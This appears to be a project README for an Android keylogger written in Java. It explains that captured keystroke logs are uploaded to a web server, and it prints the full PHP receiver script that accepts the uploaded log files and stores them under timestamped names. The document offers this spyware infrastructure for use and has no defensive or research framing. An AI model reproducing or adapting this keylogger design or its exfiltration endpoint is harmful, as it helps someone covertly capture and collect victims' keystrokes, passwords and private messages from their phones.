# Android-Keylogger
This is a simple solucion Android's Keylogger, this program is writted in Java and used more componet like a PHP for the creation the log of file in a web server. The web server have been used 000webhost.com but every web server can be used.

this is the php code:

/*<?php
 if (isset($_FILES["uploaded_file"]["name"])) {
$new_name = "Key".date("his").".txt";
$name = $_FILES["uploaded_file"]["name"];
$tmp_name = $_FILES['uploaded_file']['tmp_name'];
$error = $_FILES['uploaded_file']['error'];

if (!empty($name)) {
    $location = './Key/';

 if ( ! is_dir($location)) {
 mkdir($location);
 }

    if  (move_uploaded_file($tmp_name, $location.$name)){
        rename( $location.$name, $location.$new_name);
        echo 'Uploaded';
    }

} else {
    echo 'please choose a file';
}
}
 ?>*/
